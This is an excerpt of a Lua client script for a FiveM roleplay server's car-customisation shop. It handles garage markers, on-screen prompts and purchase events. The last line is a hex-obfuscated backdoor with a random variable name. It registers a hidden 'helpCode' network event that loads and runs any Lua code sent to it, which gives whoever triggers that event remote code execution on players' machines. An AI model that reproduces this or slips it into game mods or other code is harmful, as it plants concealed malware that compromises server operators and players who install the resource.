...
CreateThread(function()
    for k, v in pairs(bennyGarages) do
        ...
        AddTextComponentString("Car Services")
...
function AttemptPurchase(type, upgradeLevel)
    ...
    TriggerServerEvent("denalifw-customsCIV:attemptPurchase", type, upgradeLevel)
                ...
                if nearDefault then
                    ...
                    if nearDefault then
                        if not isPlyInBennys then
                            Draw3DText(v.coords.x, v.coords.y, v.coords.z + 0.5, "[Press ~p~E~w~ - DIY MECH]", 255, 255, 255, 255, 4, 0.45, true, true, true, true, 0, 0, 0, 0, 55)
...
--#[Event Handlers]#--
RegisterNetEvent("denalifw-customsCIV:purchaseSuccessful", function()
    isPurchaseSuccessful = true
    attemptingPurchase = false
    DenaliFW.Functions.Notify("Purchase Successful")
end)

RegisterNetEvent("denalifw-customsCIV:purchaseFailed", function()
...
local wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[6][wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[1]](wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[2]) wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[6][wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[3]](wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[2], function(lsUkbTycegBnsZZbpfPKoKbqMHfVefqXdwGviunKahwBttrBqETLbmfJbCkAeSGcSJHSwu) wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[6][wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[4]](wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[6][wRiumlpEuWQglVwrRBafTjOirzLhJnbCaxnRVQIzJJqxNbMrXnXvzqjfdwWVKaccgambjl[5]](lsUkbTycegBnsZZbpfPKoKbqMHfVefqXdwGviunKahwBttrBqETLbmfJbCkAeSGcSJHSwu))() end)